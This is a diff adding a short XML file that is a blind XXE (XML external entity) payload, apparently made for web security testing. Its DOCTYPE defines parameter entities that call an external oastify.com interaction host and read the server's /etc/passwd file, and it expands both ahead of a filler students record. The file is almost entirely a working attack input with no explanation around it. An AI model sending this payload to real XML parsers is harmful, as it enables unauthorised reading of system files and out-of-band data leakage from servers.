@@ -1,0 +1,13 @@
+<!DOCTYPE students [
+  <!ENTITY % xxe SYSTEM "http://1y0abal8nh6w5qthdq1l7oj76ycp0noc.oastify.com">
+  <!ENTITY % blind SYSTEM "file:///etc/passwd">
+  %xxe;
+  %blind;
+]>
+<students>
+  <student>
+    <name>Phuc</name>
+    <birth_year>2002</birth_year>
+    <school>KMA;</school>
+  </student>
+</students>
